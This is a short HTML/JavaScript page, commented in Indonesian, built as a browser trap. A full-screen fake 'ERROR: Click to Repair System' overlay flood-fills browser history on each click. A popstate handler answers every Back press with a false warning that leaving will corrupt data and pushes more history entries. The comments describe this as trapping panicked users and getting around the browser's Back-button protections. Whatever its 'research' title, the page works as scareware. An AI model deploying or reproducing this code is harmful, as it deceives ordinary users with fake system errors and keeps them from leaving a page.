<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interaction Research</title>
    <style>
        body { margin: 0; background: #000; color: #00ff00; font-family: monospace; overflow: hidden; }
        /* Tombol transparan raksasa di seluruh layar */
        #trap {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            background: rgba(0,0,0,0.1); display: flex; align-items: center;
            justify-content: center; z-index: 999; cursor: pointer;
        }
        .msg { padding: 20px; border: 2px solid #00ff00; pointer-events: none; }
    </style>
</head>
<body>

    <div id="trap">
        <div class="msg">ERROR: Click to Repair System</div>
    </div>

    <script>
        const trap = document.getElementById('trap');
        let counter = 0;

        // Tiap kali user klik (karena panik atau mau repair), kita jebloskan ke history
        trap.onclick = function() {
            counter++;
            for (let i = 0; i < 20; i++) {
                window.history.pushState({p: i}, "", `?fix_attempt=${counter}_${i}`);
            }
            alert("System Repairing... Please wait (" + counter + "/10)");
        };

        // KUNCINYA: Saat user tekan Back, kita deteksi dan paksa klik lagi
        window.onpopstate = function() {
            // Kita kasih alert biar user harus KLIK 'OK' (interaksi baru!)
            // Ini akan mereset 'User Activation' dan memvalidasi history baru
            alert("Warning: Leaving this page may corrupt your data! Click OK to stay safe.");
            for (let i = 0; i < 10; i++) {
                window.history.pushState(null, "", "?persistence=" + Math.random());
            }
        };
    </script>
</body>
</html>
